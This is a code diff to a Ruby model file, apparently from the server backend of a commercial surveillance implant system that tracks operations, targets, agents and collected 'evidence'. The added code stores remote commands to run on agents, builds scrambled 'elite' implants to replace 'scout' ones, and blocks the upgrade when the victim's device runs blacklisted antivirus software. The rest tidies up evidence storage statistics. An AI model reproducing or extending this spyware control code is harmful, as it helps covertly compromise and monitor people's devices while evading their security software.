@@ -40,7 +40,8 @@ class Item
   field :platform, type: String
   field :deleted, type: Boolean, default: false
   field :uninstalled, type: Boolean
-  field :demo, type: Boolean
+  field :demo, type: Boolean, default: false
+  field :scout, type: Boolean, default: false
   field :upgradable, type: Boolean
   field :purge, type: Array, default: [0, 0]
 
@@ -57,7 +58,8 @@ class Item
   embeds_many :download_requests, class_name: "DownloadRequest"
   embeds_many :upgrade_requests, class_name: "UpgradeRequest"
   embeds_many :upload_requests, class_name: "UploadRequest"
-  
+  embeds_many :exec_requests, class_name: "ExecRequest"
+
   embeds_one :stat
 
   embeds_many :configs, class_name: "Configuration"
@@ -73,7 +75,7 @@ class Item
   after_create :create_callback
   before_destroy :destroy_callback
 
-  before_update :status_change_callback
+  after_update :status_change_callback
   after_update :notify_callback
 
   before_create :do_checksum
@@ -110,7 +112,7 @@ class Item
       when 'operation'
         self.stat.size = 0;
         self.stat.grid_size = 0;
-        targets = Item.where(_kind: 'target').also_in(path: [self._id])
+        targets = Item.where(_kind: 'target').also_in(path: [self._id]).only(:stat)
         targets.each do |t|
           self.stat.size += t.stat.size
           self.stat.grid_size += t.stat.grid_size
@@ -120,21 +122,30 @@ class Item
         end
         self.save
       when 'target'
-        self.stat.grid_size = 0;
         self.stat.evidence = {}
         self.stat.dashboard = {}
-        agents = Item.where(_kind: 'agent', deleted: false).also_in(path: [self._id])
+        agents = Item.where(_kind: 'agent', deleted: false).also_in(path: [self._id]).only(:stat)
         agents.each do |a|
           self.stat.evidence.merge!(a.stat.evidence) {|k,o,n| o+n }
           self.stat.dashboard.merge!(a.stat.dashboard) {|k,o,n| o+n }
-          self.stat.grid_size += a.stat.grid_size
           if (not a.stat.last_sync.nil?) and (self.stat.last_sync.nil? or a.stat.last_sync > self.stat.last_sync)
             self.stat.last_sync = a.stat.last_sync
           end
         end
         db = Mongoid.database
-        collection = db.collections.select {|c| c.name == Evidence.collection_name(self._id.to_s)}
-        self.stat.size = collection.first.stats()['size'].to_i unless collection.empty?
+        # evidence size
+        collection = db.collection('evidence.' + self._id.to_s)
+        self.stat.size = collection.stats['size'].to_i
+        # grid size
+        begin
+          collection = db.collection('grid.' + self._id.to_s + '.files')
+          self.stat.grid_size = collection.stats['size'].to_i
+          collection = db.collection('grid.' + self._id.to_s + '.chunks')
+          self.stat.grid_size += collection.stats['size'].to_i
+        rescue Mongo::OperationFailure
+          # the grid collection is not present
+          self.stat.grid_size = 0
+        end
         self.save
       when 'agent'
         self.stat.evidence = {}
@@ -296,30 +307,27 @@ class Item
     # delete any pending upgrade if requested multiple time
     self.upgrade_requests.destroy_all if self.upgradable
 
+    if self.scout
+      # check the presence of blacklisted AV in the device evidence
+      blacklisted_software?
+
+      # if it's a scout, there a special procedure
+      return upgrade_scout
+    end
+
     factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
     build = RCS::DB::Build.factory(self.platform.to_sym)
     build.load({'_id' => factory._id})
     build.unpack
     build.patch({'demo' => self.demo})
 
-    if self.version < 2012041601 and ['windows', 'osx', 'ios'].include? self.platform
-      trace :info, "Upgrading #{self.name} from 7.x to 8.x"
-      # file needed to upgrade from version 7.x to daVinci
-      content = self.configs.last.encrypted_config(self[:confkey])
-      self.upload_requests.create!({filename: 'nc-7-8dv.cfg', _grid: [RCS::DB::GridFS.put(content, {filename: 'nc-7-8dv.cfg'})] })
-    end
-
     # then for each platform we have differences
     case self.platform
       when 'windows'
-        if self.version < 2012041601
-          add_upgrade('dll64', File.join(build.tmpdir, 'core64'))
-        else
-          add_upgrade('core64', File.join(build.tmpdir, 'core64'))
-          # TODO: driver removal
-          #add_upgrade('driver', File.join(build.tmpdir, 'driver'))
-          #add_upgrade('driver64', File.join(build.tmpdir, 'driver64'))
-        end
+        add_upgrade('core64', File.join(build.tmpdir, 'core64'))
+        # TODO: driver removal
+        #add_upgrade('driver', File.join(build.tmpdir, 'driver'))
+        #add_upgrade('driver64', File.join(build.tmpdir, 'driver64'))
       when 'osx'
         add_upgrade('inputmanager', File.join(build.tmpdir, 'inputmanager'))
         add_upgrade('driver', File.join(build.tmpdir, 'driver'))
@@ -345,6 +353,23 @@ class Item
     self.save
   end
 
+  def upgrade_scout
+    factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
+    build = RCS::DB::Build.factory(self.platform.to_sym)
+    build.load({'_id' => factory._id})
+    build.unpack
+    build.patch({'demo' => self.demo})
+    build.scramble
+    build.melt({'bit64' => true, 'codec' => true, 'scout' => false})
+
+    add_upgrade('elite', File.join(build.tmpdir, 'output'))
+
+    build.clean
+
+    self.upgradable = true
+    self.save
+  end
+
   def add_default_filesystem_requests
     return if self[:_kind] != 'agent'
 
@@ -361,13 +386,7 @@ class Item
   def create_callback
     case self._kind
       when 'target'
-        # create the collection for the target's evidence and shard it
-        db = Mongoid.database
-        collection = db.collection(Evidence.collection_name(self._id))
-        # ensure indexes
-        Evidence.collection_class(self._id).create_indexes
-        # enable sharding only if not enabled
-        RCS::DB::Shard.set_key(collection, {type: 1, da: 1, aid: 1})
+        self.create_evidence_collections
     end
 
     RCS::DB::PushManager.instance.notify(self._kind, {id: self._id, action: 'create'})
@@ -375,7 +394,7 @@ class Item
 
   def notify_callback
     # we are only interested if the properties changed are:
-    interesting = ['name', 'desc', 'status', 'instance', 'version', 'deleted', 'uninstalled']
+    interesting = ['name', 'desc', 'status', 'instance', 'version', 'deleted', 'uninstalled', 'scout']
     return if not interesting.collect {|k| changes.include? k}.inject(:|)
 
     RCS::DB::PushManager.instance.notify(self._kind, {id: self._id, action: 'modify'})
@@ -390,6 +409,8 @@ class Item
     ::Injector.all.each {|p| p.delete_rule_by_item(self._id)}
     # remove the connector rules that contains the item
     ::Connector.all.each {|p| p.delete_if_item(self._id)}
+    # remove backups for operations or targets
+    ::Backup.all.each {|b| b.delete_if_item(self._id)}
 
     case self._kind
       when 'operation'
@@ -405,9 +426,7 @@ class Item
           agent.destroy
         end
         trace :info, "Dropping evidence for target #{self.name}"
-        # drop the evidence collection of this target
-        Mongoid.database.drop_collection Evidence.collection_name(self._id.to_s)
-        RCS::DB::GridFS.delete_collection(self._id.to_s)
+        self.drop_evidence_collections
       when 'agent'
         # dropping flag is set only by cascading from target
         unless self[:dropping]
@@ -427,16 +446,55 @@ class Item
     raise
   end
 
+  def drop_evidence_collections
+    return if self._kind != 'target'
+
+    # drop the evidence collection of this target
+    Evidence.collection_class(self._id.to_s).collection.drop
+    RCS::DB::GridFS.drop_collection(self._id.to_s)
+  end
+
+  def create_evidence_collections
+    return if self._kind != 'target'
+
+    # create the collection for the target's evidence and shard it
+    db = Mongoid.database
+    collection = db.collection(Evidence.collection_name(self._id))
+    # ensure indexes
+    Evidence.collection_class(self._id).create_indexes
+    # enable sharding only if not enabled
+    RCS::DB::Shard.set_key(collection, {type: 1, da: 1, aid: 1})
+  end
+
+  def blacklisted_software?
+    raise "Cannot determine blacklist" if self._kind != 'agent'
+
+    device = Evidence.collection_class(self.path.last).where({type: 'device', aid: self._id.to_s}).last
+    raise "Cannot determine installed software" unless device
+
+    installed = device[:data]['content']
+
+    File.readlines(RCS::DB::Config.instance.file('blacklist')).each do |offending|
+      trace :debug, "Checking for #{offending.chomp}"
+      if Regexp.new(offending.chomp, Regexp::IGNORECASE).match installed
+        trace :warn, "Blacklisted software detected: #{offending}"
+        raise "The target device contains a software that prevent the upgrade."
+      end
+    end
+  end
+
   def self.offload_destroy(params)
     item = ::Item.find(params[:id])
-    raise "item not found" if item.nil?
     item.destroy
+  rescue Exception => e
+    trace :error, "Offload destroy: #{e.message}"
   end
 
   def self.offload_destroy_callback(params)
     item = ::Item.find(params[:id])
-    raise "item not found" if item.nil?
     item.destroy_callback
+  rescue Exception => e
+    trace :error, "Offload destroy: #{e.message}"
   end
 
   def status_change_callback
@@ -533,6 +591,14 @@ class UploadRequest
     # remove the content from the grid
     RCS::DB::GridFS.delete self[:_grid].first unless self[:_grid].nil?
   end
+end
+
+class ExecRequest
+  include Mongoid::Document
+
+  field :command, type: String
+
+  embedded_in :item
 end
 
 class Stat
